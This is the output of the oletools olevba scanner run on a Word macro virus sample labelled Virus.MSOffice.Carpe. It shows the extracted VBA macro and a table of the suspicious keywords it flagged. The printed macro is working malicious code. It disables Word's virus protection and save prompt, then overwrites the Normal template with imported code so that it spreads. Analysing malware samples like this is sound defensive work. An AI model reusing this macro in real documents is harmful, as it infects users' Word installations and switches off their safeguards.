olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Carpe
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSOffice.Carpe 
in file: ./Virus.MSOffice.Carpe - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Call vbloader
Sub vbloader()
On Error Resume Next
Set wo = CreateObject("Word.Application")
wo.Options.VirusProtection = (Rnd * 0)
wo.Options.SaveNormalPrompt = (Rnd * 0)
wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.deletelines 1 ,wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.countoflines 
wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile "c:\wrdvbs.exp"
wo.NormalTemplate.Save
wo.Quit
 
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

